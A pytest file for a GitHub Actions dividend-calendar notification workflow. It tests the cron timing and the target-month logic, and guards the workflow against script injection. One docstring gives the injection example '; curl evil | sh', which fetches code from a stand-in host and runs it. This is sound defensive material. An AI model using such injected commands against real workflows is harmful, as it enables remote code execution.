"""v19.537:除息行事曆推播「排程日 ↔ 目標月」配對 + 手動補送月份(target_month)。

## 這個檔案在守什麼(為什麼會有這一組測試)

`.github/workflows/dividend_calendar_notify.yml` 的 **cron** 與
`scripts/dividend_calendar_notify.main()` 算出來的**目標月**是**一組配對**,
只准這兩種組合:

    月底(28 號)發 → **下個月**      ← 現行
    月初(1 號)發  → **本月**

**「月初發下個月」是被 user 2026-09-01 明確否決的組合**
(「我想要月底發布下個月的配息基準日,不然就是月初例如 1 號發布這個月的配息基準日,
絕對不會是月初發布下個月」)。

**成因(這組測試存在的理由)**:workflow 2026-08-13 建立時是「1 號發本月」,
2026-08-24 commit `2ec9819`(PR #705)把目標月改成**下個月**,**cron 沒有跟著改** →
悄悄變成「1 號發下個月」,於是 **2026 年 9 月的行事曆永遠不會被自動送出**
(舊設定的 9/1 送 10 月、新設定的 9/28 也送 10 月,兩條路徑都產不出 9 月;
只能靠 `target_month` 補送)。
⚠️ 上一句說的是「**設定會產生什麼結果**」,**不是**「某次排程執行送了什麼」——
這條 workflow **至今一次排程都沒跑過**(2026-09-01 查 Actions API:6 次執行**全部**是
`workflow_dispatch`、最早 2026-08-24,`event=schedule` 命中 **0**)。
→ 只改一邊不會有任何東西報錯,所以要用測試把 cron 字面值鎖住。

## 附帶守的三件事
1. `target_month`(手動補送):留空 = **看今天幾號**(4 號~月底 → 下個月;1~3 號 → 本月,
   見 `_LATE_RUN_GRACE_DAYS`);格式錯 → **exit 2 報錯**,
   **不可**靜默退回下個月(§1:讓 user 以為補送成功卻收到別的月份 = 最糟的失敗模式)。
2. `ref_year/ref_month/ref_day` = **執行當下**,**不跟著目標月跑**(陳舊度量測基準)。
3. workflow 沒有把 user 可控的 `target_month` 插進 `run:` 指令列(script injection)。
"""
from __future__ import annotations

import datetime as _dt
import re
import subprocess
import sys
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_ROOT))

import fund_fetcher  # noqa: F401,E402  (prime latent 互 import,與其他 notify 測試同)
from scripts import dividend_calendar_notify as M  # noqa: E402

WORKFLOW = _ROOT / ".github" / "workflows" / "dividend_calendar_notify.yml"

# 「28 號 00:23 UTC = 台灣 28 號 08:23」。改這個常數前先讀本檔開頭的配對說明。
EXPECTED_CRON = "23 0 28 * *"


# ══════════════════════════════════════════════════════════════════════
# 1. cron 漂移鎖 —— 排程日與目標月是一組配對
# ══════════════════════════════════════════════════════════════════════
def _workflow_text() -> str:
    return WORKFLOW.read_text(encoding="utf-8")


def test_cron_is_28th_0023_utc():
    """cron 必須是 `23 0 28 * *`(台灣 28 號 08:23)。

    **28 號**:2 月沒有 29~31 號 → 固定 28 號才保證每月觸發**恰好一次**,
              不必再寫「今天是不是當月最後一天」的判斷(29/30/31 會讓 2 月整月漏發)。
    **分鐘 23**:GitHub 官方文件明列排程在**整點**為高負載時段,會延遲甚至直接丟棄 job;
              本 repo 實測整點的 `update_macro_history.yml`,13 次觸發最快也要 61.9 分鐘才
              起跑(中位數 144 分鐘、最長 693 分鐘)。錯開整點。
    **配對**:28 號 ⇔ 推「下個月」(`scripts/dividend_calendar_notify.main`)。
              要改成 1 號,目標月必須同時改回「本月」,否則就是 user 否決的
              「月初發下個月」——2026-08-24 只改一邊正是本次事故。
    """
    crons = re.findall(r"^\s*-\s*cron:\s*[\"']([^\"']+)[\"']\s*$", _workflow_text(), re.M)
    assert crons == [EXPECTED_CRON], (
        f"除息行事曆 cron 漂移:{crons} != ['{EXPECTED_CRON}']。"
        "排程日與 main() 目標月是一組配對(28 號 ⇔ 下個月 / 1 號 ⇔ 本月),"
        "只改一邊會變成 user 2026-09-01 否決的「月初發下個月」。"
    )


def test_cron_day_of_month_never_skips_february():
    """cron 的「日」欄不可 > 28 —— 2 月沒有 29~31 號,填了就會整月漏發。"""
    cron = re.search(r"cron:\s*[\"']([^\"']+)[\"']", _workflow_text()).group(1)
    _dom = cron.split()[2]
    assert _dom.isdigit() and 1 <= int(_dom) <= 28, f"日欄 {_dom!r} 不保證每月都觸發"


def test_cron_minute_avoids_top_of_hour():
    """分鐘不可為 0 —— 整點是 GitHub 排程高負載時段,會延遲甚至丟棄 job。"""
    cron = re.search(r"cron:\s*[\"']([^\"']+)[\"']", _workflow_text()).group(1)
    assert cron.split()[0] != "0", "整點排程實測延遲中位數 144 分鐘、最長 693 分鐘 → 錯開"


def test_workflow_comment_states_the_pairing():
    """§1:註解必須寫明「28 號 ↔ 下個月」的配對,否則下一個人又只改一半。"""
    _t = _workflow_text()
    assert "28" in _t and "下個月" in _t and "配對" in _t


def test_workflow_yaml_parses_and_declares_target_month():
    """YAML 合法 + `workflow_dispatch` 有 target_month(預設空 = 下個月)。"""
    yaml = pytest.importorskip("yaml")           # pyyaml 為 pre-commit 傳遞依賴,缺則略過
    doc = yaml.safe_load(_workflow_text())
    # ⚠️ YAML 1.1 會把裸 `on:` 解析成布林 True(不是字串 "on")—— 兩種都接。
    on_cfg = doc.get("on") if "on" in doc else doc.get(True)
    assert on_cfg["schedule"] == [{"cron": EXPECTED_CRON}]
    _inputs = on_cfg["workflow_dispatch"]["inputs"]
    assert "target_month" in _inputs, "缺 target_month → 手動觸發也只能送下個月,無法補送"
    assert _inputs["target_month"]["default"] == "", "預設須為空字串(= 走排程的下個月)"
    assert "YYYY-MM" in _inputs["target_month"]["description"]


# `${{ ... }}` 一個插值運算式(非貪婪,GitHub 的插值不可巢狀)。
_INTERP_RE = re.compile(r"\$\{\{(.*?)\}\}", re.S)
# 唯一允許的那一行:env 區塊裡把 input 綁成環境變數。
_ENV_BIND_RE = re.compile(
    r"^\s*TARGET_MONTH:\s*\$\{\{\s*github\.event\.inputs\.target_month\s*\}\}\s*$")


def test_target_month_interpolation_appears_only_on_the_env_binding_line():
    """**安全**(不需 pyyaml 的底線守衛):全檔提到 target_month 的插值**只准有那一行 env 綁定**。

    GitHub Actions 的 `${{ }}` 是在 shell 執行**之前**做字串代換 → user 在
    `target_month` 填 `; curl evil | sh` 之類就會被當指令跑(script injection)。
    正確做法是走 `env:`,由 Python 讀 `os.environ`。

    ⚠️ **為什麼要有這條「只准出現在那一行」的寫法**(v19.538 修的盲區):
    舊版守衛是 `_t[_t.index("        run: >"):]` —— `str.index` 找的是**第一個** `run: >`,
    而本 workflow 的**第一個** run 區塊是安裝 Chromium 那步的 `run: |`(不是 `run: >`),
    於是切點落在檔案**後段**,前面所有 `run:` 全部在守衛的視線之外。
    實測:把 `${{ github.event.inputs.target_month }}` 插進 Chromium 那步的 `run: |`
    → **37 passed,完全沒抓到**。本條與下一條(逐 step 走訪)一起把那個盲區補掉。

    本條刻意**不依賴 pyyaml**(它只是 pre-commit 的傳遞依賴,不在 requirements 裡)——
    安全守衛不該因為某個環境少裝一個套件就**靜默 skip**。
    """
    _t = _workflow_text()
    _bad = []
    for _ln, _line in enumerate(_t.splitlines(), start=1):
        if not any("target_month" in _e.lower() for _e in _INTERP_RE.findall(_line)):
            continue                       # 這行沒有提到 target_month 的插值
        if _ENV_BIND_RE.match(_line):
            continue                       # 唯一合法用法
        _bad.append(f"{_ln}: {_line.strip()}")
    assert not _bad, ("target_month 只准出現在 `TARGET_MONTH: ${{ ... }}` 那一行 env 綁定;"
                      f"以下位置是 script injection 風險 → {_bad}")
    # 反向:那一行必須真的還在(否則 Python 端永遠讀不到補送月份)
    assert any(_ENV_BIND_RE.match(_l) for _l in _t.splitlines()), "應改走 env 傳遞"


def test_no_step_in_any_job_interpolates_target_month_into_run():
    """**安全**:走訪**所有 job 的所有 step**,`run:` 字串裡不得有提到 target_month 的插值。

    這是上一條的結構化版本 —— 上一條用行掃描(不依賴 pyyaml、絕不 skip),
    這一條真的把 YAML 解析開、逐 step 檢查 `run`,兩條一起才不會再出現
    「切點只切到某一個 run 區塊」那種盲區。

    ⚠️ 檢查的是**插值運算式內部**是否提到 target_month(大小寫不分,故 `${{ env.TARGET_MONTH }}`
    同樣會被抓)。純文字出現 `target_month`(例如 shell 註解)不算 —— 沒有插值就沒有代換,
    也就沒有 injection。
    """
    yaml = pytest.importorskip("yaml")           # pyyaml 為 pre-commit 傳遞依賴,缺則略過
    doc = yaml.safe_load(_workflow_text())
    _steps = [(_jn, _i, _st)
              for _jn, _job in (doc.get("jobs") or {}).items()
              for _i, _st in enumerate(_job.get("steps") or [])]
    assert _steps, "解析不到任何 step → 這條測試等於沒在守,先修解析"
    _bad = []
    for _jn, _i, _st in _steps:
        _run = _st.get("run")
        if not isinstance(_run, str):
            continue
        for _expr in _INTERP_RE.findall(_run):
            if "target_month" in _expr.lower():
                _bad.append(f"job={_jn} step#{_i}({_st.get('name') or _st.get('uses')}): "
                            f"${{{{{_expr}}}}}")
    assert not _bad, ("user 可控的 target_month 被插進 run: 指令列 → script injection;"
                      f"改走 env: 由 Python 讀 os.environ → {_bad}")


# ── v19.539 B-5:上面兩條是**黑名單**(只看插值裡有沒有 `target_month`),看不見整包 dump ──
# 實測 13 個 workflow 突變,11 個轉紅,**漏掉這兩個**:
#     ${{ toJSON(github.event.inputs) }}      ${{ github.event.inputs }}
# 兩者都會把**整包 inputs**(含 user 可控的 target_month)代換進 `run:`,是 GitHub 官方
# 硬化指南點名的形態,而字面上完全沒有 `target_month` 這個詞 → 黑名單結構上看不到。
# 修法:改成**白名單** —— `run:` 裡只准出現 dry_run 那一個布林三元式,其餘一律紅燈。
_ALLOWED_RUN_INTERP = "github.event.inputs.dry_run == 'true' && '--dry-run' || ''"
# `NAME: ${{ ... }}` 獨佔一行 = env/with 綁定(值進環境變數,不進 shell 指令列)。
_ENV_BINDING_LINE_RE = re.compile(r"^\s*[A-Za-z_][A-Za-z0-9_-]*:\s*\$\{\{[^{}]*\}\}\s*$")


def _norm_expr(expr: str) -> str:
    """插值運算式正規化(GitHub 對空白不敏感,守衛也不該被空白騙過)。"""
    return " ".join(expr.split())


def test_every_interpolation_in_the_file_is_either_an_env_binding_or_the_dry_run_ternary():
    """**白名單底線守衛**(不依賴 pyyaml):全檔每一個 `${{ }}` 只准是這兩種之一。

      1. `NAME: ${{ ... }}` 獨佔一行 —— env / with 綁定,值進環境變數不進指令列;
      2. `${{ github.event.inputs.dry_run == 'true' && '--dry-run' || '' }}` —— 唯一一個
         進 `run:` 的插值,展開結果只可能是固定字面值 `--dry-run` 或空字串,不含 user 輸入。

    白名單的**重點**是它不必事先知道危險長什麼樣子:`${{ toJSON(github.event.inputs) }}`、
    `${{ github.event.inputs }}`、`${{ github.event.issue.title }}` 這些都不在清單上 → 一律紅。
    ⚠️ 射程誠實話:本條是**行掃描**,`NAME: ${{ ... }}` 這個形狀若出現在 `run:` 的 shell
       腳本裡(例如 `run: |` 內寫 `FOO: ${{ toJSON(github.event) }}`)會被誤放行 ——
       那一半由下一條(逐 step 解析 `run` 字串)負責。兩條合起來才完整。
    """
    _bad = []
    for _ln, _line in enumerate(_workflow_text().splitlines(), start=1):
        for _expr in _INTERP_RE.findall(_line):
            if _ENV_BINDING_LINE_RE.match(_line):
                continue                                   # 1. env / with 綁定
            if _norm_expr(_expr) == _ALLOWED_RUN_INTERP:
                continue                                   # 2. 唯一允許進 run: 的插值
            # 3. 註解裡的**空**佔位符 `${{ }}`(本檔的安全註解就在講這件事)。
            #    只放行「空的」:註解若在 YAML 層會被丟掉(無害),但若是 `run:` 區塊內的
            #    **shell 註解**,GitHub 仍會先做字串代換 —— 值裡有換行就能跳出註解變成指令。
            #    故帶任何運算式的插值,即使寫在 `#` 後面也一律紅燈。
            if _line.lstrip().startswith("#") and not _norm_expr(_expr):
                continue
            _bad.append(f"{_ln}: ${{{{{_expr}}}}}")
    assert not _bad, (
        "workflow 出現不在白名單上的插值 → 只准 `NAME: ${{ ... }}` env 綁定,"
        f"或 run: 裡那一個 dry_run 三元式;越權的有 → {_bad}")


def test_no_run_step_interpolates_anything_but_the_dry_run_ternary():
    """**白名單**(結構化版):逐 job 逐 step 解析 `run:`,裡面的插值只准是 dry_run 三元式。

    這條補的是上一條看不見的東西 —— 整包 dump:
    `${{ toJSON(github.event.inputs) }}` / `${{ github.event.inputs }}` 會把**整包 inputs**
    (含 user 可控的 `target_month`)在 shell 執行**之前**代換進指令列。
    `test_no_step_in_any_job_interpolates_target_month_into_run` 那條黑名單找的是字面
    `target_month`,整包 dump 裡沒有這個詞 → 它抓不到(實測突變:綠燈通過)。
    """
    yaml = pytest.importorskip("yaml")           # pyyaml 為 pre-commit 傳遞依賴,缺則略過
    doc = yaml.safe_load(_workflow_text())
    _steps = [(_jn, _i, _st)
              for _jn, _job in (doc.get("jobs") or {}).items()
              for _i, _st in enumerate(_job.get("steps") or [])]
    assert _steps, "解析不到任何 step → 這條測試等於沒在守,先修解析"
    _bad = []
    for _jn, _i, _st in _steps:
        _run = _st.get("run")
        if not isinstance(_run, str):
            continue
        for _expr in _INTERP_RE.findall(_run):
            if _norm_expr(_expr) != _ALLOWED_RUN_INTERP:
                _bad.append(f"job={_jn} step#{_i}({_st.get('name') or _st.get('uses')}): "
                            f"${{{{{_expr}}}}}")
    assert not _bad, (
        "`run:` 裡出現不在白名單上的插值(整包 dump / 任何 github.event 欄位都算)→ "
        f"改走 env: 由程式讀 os.environ → {_bad}")


def test_the_whitelisted_dry_run_expression_still_exists():
    """反向鎖:白名單那一式必須真的還在,否則 `dry_run=true` 會變成實送(§1 最糟的失敗模式)。"""
    _exprs = [_norm_expr(_e) for _e in _INTERP_RE.findall(_workflow_text())]
    assert _ALLOWED_RUN_INTERP in _exprs, "dry_run 三元式不見了 → 手動 dry-run 會實際推播"


# ══════════════════════════════════════════════════════════════════════
# 2. _resolve_target_month —— 純函式
# ══════════════════════════════════════════════════════════════════════
def _now(y, m, d):
    return _dt.datetime(y, m, d, 8, 23, tzinfo=_dt.timezone(_dt.timedelta(hours=8)))


@pytest.mark.parametrize("raw", [None, "", "   "])
def test_unspecified_means_next_month(raw):
    assert M._resolve_target_month(_now(2026, 9, 28), raw) == (2026, 10)


def test_unspecified_december_rolls_to_next_year():
    assert M._resolve_target_month(_now(2026, 12, 28), None) == (2027, 1)


def test_unspecified_february_28_gives_march():
    assert M._resolve_target_month(_now(2026, 2, 28), None) == (2026, 3)


# ── v19.538 B-4:排程遲到跨月 → 2 月整月無聲跳過 ──────────────────────────
# `_now_tw()` 取的是**任務實際起跑時刻**,不是排程時刻。cron 28 號 08:23 台灣,
# 延遲 > 937 分就跨過台灣午夜;非閏年 2/28 是月底 → `now` 變 3/1 → 「下個月」= 4 月,
# **3 月整月無聲跳過**。實測本 repo 排程延遲(update_macro_history,13 次)最長 692.8 分,
# 餘裕僅 244 分。修法:未指定月份且 `now.day <= _LATE_RUN_GRACE_DAYS` → 視為遲到 → 本月。


def test_late_february_run_does_not_skip_march():
    """**這一組是 B-4 的核心**:2027-02-28 那一跑遲到跨月,目標仍須是 3 月(不是 4 月)。"""
    assert M._resolve_target_month(_now(2027, 2, 28), None) == (2027, 3)     # 準時
    assert M._resolve_target_month(_now(2027, 3, 1), None) == (2027, 3)      # 遲到 → 同一個月


def test_late_december_run_keeps_january_and_the_year():
    """12/28 遲到到 1/1:目標仍是 1 月、且年份要跟著跨(不是回到去年 1 月)。"""
    assert M._resolve_target_month(_now(2026, 12, 28), None) == (2027, 1)    # 準時
    assert M._resolve_target_month(_now(2027, 1, 1), None) == (2027, 1)      # 遲到


@pytest.mark.parametrize("day", [1, 2, 3])
def test_days_inside_the_grace_window_target_this_month(day):
    """1~3 號未指定月份 → **本月**(= user 允許的「月初發本月」,不是被否決的「月初發下個月」)。"""
    assert M._resolve_target_month(_now(2026, 9, day), None) == (2026, 9)


@pytest.mark.parametrize("day", [4, 15, 27, 28, 29, 30])
def test_days_outside_the_grace_window_still_target_next_month(day):
    """**寬限窗不可外溢**:4 號以後(含 28 號準時那一跑)行為一個字都沒變 → 下個月。"""
    assert M._resolve_target_month(_now(2026, 9, day), None) == (2026, 10)


def test_grace_window_never_applies_when_month_is_specified():
    """明填 `target_month` → `now` 完全不參與,寬限窗不得插手(補送才可靠)。"""
    for _d in (1, 2, 3, 15, 28):
        assert M._resolve_target_month(_now(2026, 9, _d), "2026-11") == (2026, 11)


def test_grace_window_constant_is_small_enough_to_be_unreachable_by_a_real_delay():
    """常數本身的漂移鎖:寬限窗只准涵蓋「28 號那一跑遲到」,不准大到吃掉正常的月中觸發。

    落到 1 號需延遲 > 937 分、2 號 > 2377 分、3 號 > 3817 分(本 repo 實測最長 692.8 分)。
    若有人把它調到 ≥ 28,28 號準時那一跑會被判成「遲到」→ 永遠送本月 → 整個功能反向。
    """
    assert 1 <= M._LATE_RUN_GRACE_DAYS <= 5


@pytest.mark.parametrize("raw,want", [("2026-09", (2026, 9)), ("2027-01", (2027, 1)),
                                      (" 2026-12 ", (2026, 12))])
def test_explicit_month_is_used_verbatim(raw, want):
    assert M._resolve_target_month(_now(2026, 9, 1), raw) == want


@pytest.mark.parametrize("bad", ["2026-13", "2026-00", "202609", "abc", "2026-9",
                                 "26-09", "2026/09", "1999-05", "2101-05", "2026-09-01",
                                 # v19.539:`\d` 預設是 **Unicode** 數字類 —— 加 `re.ASCII` 前
                                 # 這兩個實測**會通過**,`int()` 還把它們解析成 (2026, 9)。
                                 # 結果雖然剛好對,但與「格式須 YYYY-MM」的宣稱不符,
                                 # 而且靜默接受非預期輸入本身就是 §1 的反例。
                                 "٢٠٢٦-٠٩",          # 阿拉伯-印度數字
                                 "２０２６-０９"])      # 全形數字
def test_bad_format_raises_and_never_falls_back(bad):
    """§1:格式錯 → raise,**不可**靜默回「下個月」(那會讓 user 收到別的月份還以為成功)。"""
    with pytest.raises(ValueError) as _ei:
        M._resolve_target_month(_now(2026, 9, 1), bad)
    assert bad.strip() in str(_ei.value) or repr(bad) in str(_ei.value), "錯誤訊息須帶原始值"


# ══════════════════════════════════════════════════════════════════════
# 3. main() 實跑 —— 凍結時間 + 攔截 build_month_calendar 實參
# ══════════════════════════════════════════════════════════════════════
def _divs(day=14, n=12):
    y, m, out = 2025, 1, []
    for _ in range(n):
        out.append({"ex_date": _dt.date(y, m, day).isoformat(),
                    "pay_date": _dt.date(y, m, day).isoformat(), "amount": 0.05, "yield_pct": 6.0})
        m += 1
        if m > 12:
            m, y = 1, y + 1
    return out


def _run_main(monkeypatch, *, now, argv=("--dry-run",), env=None):
    """凍結 now → 跑 main(dry-run,不觸網)→ 回傳 (rc, 攔到的 build_month_calendar 實參)。"""
    import scripts.weekly_switch_notify as W
    import services.dividend_calendar as DC

    monkeypatch.setattr(W, "_load_client_and_sheet", lambda: ("client", "sid"))
    monkeypatch.setattr(W, "_read_holdings", lambda c, s: ["TLZF9"])
    monkeypatch.setattr(W, "_read_watchlist", lambda: [])
    monkeypatch.setattr(M, "_fetch_divs",
                        lambda codes: [{"code": c, "name": f"{c}基金", "house": "",
                                        "dividends": _divs()} for c in codes])
    monkeypatch.setattr(M, "_now_tw", lambda: now)
    monkeypatch.delenv(M._TARGET_MONTH_ENV, raising=False)
    for k, v in (env or {}).items():
        monkeypatch.setenv(k, v)

    seen = {}
    _real = DC.build_month_calendar

    def _spy(funds, year, month, **kw):
        seen.update({"year": year, "month": month, **kw})
        return _real(funds, year, month, **kw)
    monkeypatch.setattr(DC, "build_month_calendar", _spy)
    rc = M.main(list(argv))
    return rc, seen


@pytest.mark.parametrize("fire,want", [
    ((2026, 9, 28), (2026, 10)),      # 一般月
    ((2026, 12, 28), (2027, 1)),      # 跨年
    ((2026, 2, 28), (2026, 3)),       # 2 月(cron 選 28 號的理由:2 月也一定觸發)
])
def test_scheduled_fire_targets_next_month(monkeypatch, fire, want):
    rc, seen = _run_main(monkeypatch, now=_now(*fire))
    assert rc == 0
    assert (seen["year"], seen["month"]) == want


def test_scheduled_fire_ref_is_today_not_target_month(monkeypatch):
    """ref_* = 執行當下(陳舊度量測基準),**不是**目標月。"""
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 28))
    assert rc == 0
    assert (seen["ref_year"], seen["ref_month"], seen["ref_day"]) == (2026, 9, 28)


def test_manual_backfill_september(monkeypatch):
    """user 的實際情境:2026-09-01 手動補送 9 月 → 目標月 9 月,ref 仍是 9/1。

    ref 若跟著目標月跑會實質誤判:月配、last_ex=2026-05-11、於 2026-09-01 量測 —
    ref=2026-09 day=1 → stale 3 個月 / too_stale=False(正確);
    ref=2026-09 day=15 → 4 / True;ref=2026-10 day=15 → 5 / True(整檔被當「疑停配」消失)。
    """
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 1),
                         argv=("--dry-run", "--target-month", "2026-09"))
    assert rc == 0
    assert (seen["year"], seen["month"]) == (2026, 9)
    assert (seen["ref_year"], seen["ref_month"], seen["ref_day"]) == (2026, 9, 1)


def test_target_month_via_env(monkeypatch):
    """workflow 走 env 傳(防 shell injection)→ Python 端必須讀得到。"""
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 1), env={"TARGET_MONTH": "2026-09"})
    assert rc == 0 and (seen["year"], seen["month"]) == (2026, 9)


def test_empty_env_is_treated_as_unspecified(monkeypatch):
    """schedule 觸發時 `${{ inputs.target_month }}` 是 null → env 為空字串。

    **排程路徑絕不能因此炸掉**,必須當成「未指定」走下個月。
    """
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 28), env={"TARGET_MONTH": ""})
    assert rc == 0 and (seen["year"], seen["month"]) == (2026, 10)


@pytest.mark.parametrize("day", [1, 2, 3])
def test_grace_window_through_main_targets_this_month(monkeypatch, day):
    """**寬限窗的 main() 層測試**(v19.539 補):`_resolve_target_month` 有單元測,
    但 `main()` 這一層原本只測了「28 號準時 / 跨年 / 2 月 / 明填 / env / 空 env / 旗標覆蓋 /
    格式錯」—— **就是沒有「day ≤ 3 且未指定」**,也就是 B-4 真正要修的那條路徑。

    這裡驗的是整條:凍結 now 到 1~3 號 → 不給 `--target-month`、env 也不給 →
    `build_month_calendar` 實際收到的目標月是**本月**;同時 `ref_day` 仍是今天幾號
    (寬限窗只換目標月,不得污染陳舊度量測基準)。
    """
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, day))
    assert rc == 0
    assert (seen["year"], seen["month"]) == (2026, 9), "1~3 號未指定 → 應視為遲到、送本月"
    assert (seen["ref_year"], seen["ref_month"], seen["ref_day"]) == (2026, 9, day)


def test_grace_window_through_main_never_fires_on_the_28th(monkeypatch):
    """配套反向:28 號那一跑(準時)行為一個字都沒變 → 仍是下個月。"""
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 28))
    assert rc == 0 and (seen["year"], seen["month"]) == (2026, 10)


def test_cli_flag_overrides_env(monkeypatch):
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 1),
                         argv=("--dry-run", "--target-month", "2026-09"),
                         env={"TARGET_MONTH": "2027-05"})
    assert rc == 0 and (seen["year"], seen["month"]) == (2026, 9)


@pytest.mark.parametrize("bad", ["2026-13", "202609", "abc"])
def test_bad_target_month_exits_2_before_any_fetch(monkeypatch, bad, capsys):
    """格式錯 → exit 2、**完全不抓資料也不推播**,錯誤訊息帶原始值(§1)。"""
    import scripts.weekly_switch_notify as W
    monkeypatch.delenv(M._TARGET_MONTH_ENV, raising=False)
    _touched = []
    monkeypatch.setattr(W, "_load_client_and_sheet", lambda: _touched.append("sheet") or (None, ""))
    monkeypatch.setattr(M, "_fetch_divs", lambda codes: _touched.append("fetch") or [])
    monkeypatch.setattr(M, "_now_tw", lambda: _now(2026, 9, 1))
    rc = M.main(["--dry-run", "--target-month", bad])
    assert rc == 2 and _touched == []
    assert bad in capsys.readouterr().err              # 訊息要指出收到的原始值


def test_bad_target_month_via_env_also_exits_2(monkeypatch):
    monkeypatch.setenv("TARGET_MONTH", "2026-13")
    monkeypatch.setattr(M, "_now_tw", lambda: _now(2026, 9, 1))
    assert M.main(["--dry-run"]) == 2


def test_cli_end_to_end_nonzero_exit():
    """真的用 subprocess 跑一次 —— 確認非 0 離開碼會傳到 GitHub Actions(不是只回傳值)。"""
    _p = subprocess.run([sys.executable, "scripts/dividend_calendar_notify.py",
                         "--dry-run", "--target-month", "2026-13"],
                        cwd=str(_ROOT), capture_output=True, text=True, timeout=180)
    assert _p.returncode != 0, _p.stdout
    assert "2026-13" in _p.stderr and "target_month" in _p.stderr


# ══════════════════════════════════════════════════════════════════════
# 5. v19.538:target_month 補送 × §16.2 事實優先(`actual_ex_for_month`)的交互
#    `06c7093` 讓 `build_month_calendar` 在目標月**已有實際紀錄**時直接顯示事實。
#    排程路徑(推下個月)**幾乎**踩不到 —— 未來月份通常還沒有紀錄;**補送過去月份幾乎必然踩到**。
#    ⚠️ 「幾乎」是刻意的措辭,不是保守:`actual_ex_for_month` 的命中條件只有「年月相同」,
#       **整條資料鏈沒有任何『未來日期』過濾**(services/dividend_calendar.py 該函式 + 其上游
#       `_parse_records`)。目標月若真的已經有一筆已公告的基準日,排程路徑當場就走事實分支。
#       今天擋住它的是 MoneyDJ 解析端把金額欄空的預告列丟掉
#       (`repositories/fund/fund_orchestration.py` wb05 迴圈 `_amt <= 0 → continue`)——
#       那是**資料巧合,不是結構保證**,而且只在 MoneyDJ 那一條路徑上。
#    這裡把「兩條路徑在**本檔 fixture 下**各自會發生什麼」鎖住,避免下次有人改動任一邊時無聲翻面。
# ══════════════════════════════════════════════════════════════════════
def _monthly_history(last_y: int, last_m: int, day: int = 11, n: int = 14) -> list:
    """n 筆月配紀錄,最後一筆落在 (last_y, last_m)。基準日一律套營業日校正。"""
    from services.dividend_calendar import roll_to_business_day
    _y, _m, out = last_y, last_m, []
    for _ in range(n):
        _ex = roll_to_business_day(_dt.date(_y, _m, day))
        out.append({"date": _ex.isoformat(),
                    "pay_date": (_ex + _dt.timedelta(days=8)).isoformat()})
        _m -= 1
        if _m == 0:
            _m, _y = 12, _y - 1
    return list(reversed(out))


def _one_event(year: int, month: int, hist: list) -> dict:
    from services.dividend_calendar import build_month_calendar
    _cal = build_month_calendar(
        [{"code": "AAA", "name": "測試月配", "house": "安聯", "dividends": hist}],
        year, month, ref_year=2026, ref_month=9, ref_day=1)
    assert len(_cal["events"]) == 1, _cal["counts"]
    return _cal["events"][0]


def test_scheduled_path_falls_back_to_the_estimate_when_the_target_month_has_no_record():
    """排程路徑(推**下個月**):本 fixture 的歷史只到 2026-08 → 10 月沒有紀錄 → 走推估。

    ⚠️ **這條測的是「沒有紀錄 → 推估」,不是「未來月份不可能有事實」**。
    舊名 `..._is_always_an_estimate_not_a_fact` 與舊 docstring(「目標月不可能已有紀錄」)
    是**被程式碼推翻的全稱句**:`actual_ex_for_month` 只比對年月,整條資料鏈沒有任何
    「未來日期」過濾;在配息表尾端補一筆 2026-10 的紀錄再推 2026-10,就會拿到
    `is_actual=True` / `confidence=high` / `error_band=0`(見本檔區段抬頭的說明)。
    目前排程路徑踩不到,靠的是 MoneyDJ 解析端丟棄金額欄空的預告列 —— 資料巧合,不是保證。
    要不要加「未來日期不採信」的過濾是**業務決策**(顯示已公告的事實可能反而是好事),
    待 user 拍板(§-1),**不在本測的射程內**。
    """
    _hist = _monthly_history(2026, 8)                 # 歷史到 2026-08 為止
    _ev = _one_event(2026, 10, _hist)                 # 9/28 那一跑推 10 月
    assert _ev["is_actual"] is False, "該月無紀錄 → 應走推估分支"
    assert _ev["error_band"] is not None               # 推估才有誤差帶


def test_backfilling_a_past_month_shows_the_fact_not_the_estimate():
    """補送**過去**月份:該月已有紀錄 → 顯示事實(`is_actual=True` / 信心 high / 誤差 0)。

    ⚠️ 這是 §1 要的行為(手上有事實就不該顯示猜測),**但**畫面上目前分不出事實與推估
    —— 全域「推估」徽章對事實格而言是錯的。那是 `06c7093` 已登記、待 UI 線框拍板的接縫。
    本測只鎖**資料層**確實走了事實分支;若哪天 L3 開始讀 `is_actual`,守衛在
    `test_dividend_anchor_v19527.py::test_is_actual_flag_is_present_on_both_branches_and_unread_by_render`。
    """
    _hist = _monthly_history(2026, 8)
    _ev = _one_event(2026, 8, _hist)                  # 於 2026-09-01 補送 2026-08
    assert _ev["is_actual"] is True
    assert _ev["confidence"] == "high"
    assert _ev["error_band"] == 0
    _last = _dt.date.fromisoformat(_hist[-1]["date"])
    assert _ev["ex_date"] == _last, "事實分支必須用歷史那一筆的基準日,不是推估值"
    assert _ev["pay_date_est"] == _dt.date.fromisoformat(_hist[-1]["pay_date"])


def test_backfilling_a_month_with_no_record_still_falls_back_to_the_estimate():
    """補送的月份**沒有**紀錄(例:9 月那次,歷史只到 8 月)→ 仍走推估,不是「無事件」。"""
    _hist = _monthly_history(2026, 8)
    _ev = _one_event(2026, 9, _hist)                  # user 的實際情境:2026-09-01 補送 9 月
    assert _ev["is_actual"] is False
    assert _ev["ex_date"].month == 9 and _ev["ex_date"].year == 2026
